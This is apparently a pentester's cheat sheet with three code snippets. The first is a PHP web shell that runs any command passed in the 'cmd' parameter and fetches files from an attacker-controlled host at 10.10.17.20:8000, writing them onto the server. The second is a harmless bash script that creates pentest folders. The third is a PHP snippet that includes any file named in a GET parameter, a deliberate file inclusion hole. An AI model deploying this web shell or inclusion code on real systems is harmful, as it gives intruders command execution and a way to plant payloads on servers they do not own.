- RCE and RFI via PHP 
  ```php
    <?php 
      if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.17.20:8000/" . $_REQUEST['fupload']));
      }
      if (isset($_REQUEST['cmd'])){
        echo system($_REQUEST["cmd"]);
      }	
    ?>
  ```
- mkt script, to create a pentesting folder environment
  ```bash
    #!/bin/bash
    if [[ $# -eq 1 ]]; then
      mkdir -p $1/{nmap,content,exploits,scripts}
      exit 0
    else
      echo "The name of the folder is needed"
      exit 1
    fi
  ```
- Execute PHP from another file
  ```php
  <?php
      $file = $_GET["file"];
      include $file; ?>
    ```

  
  

  
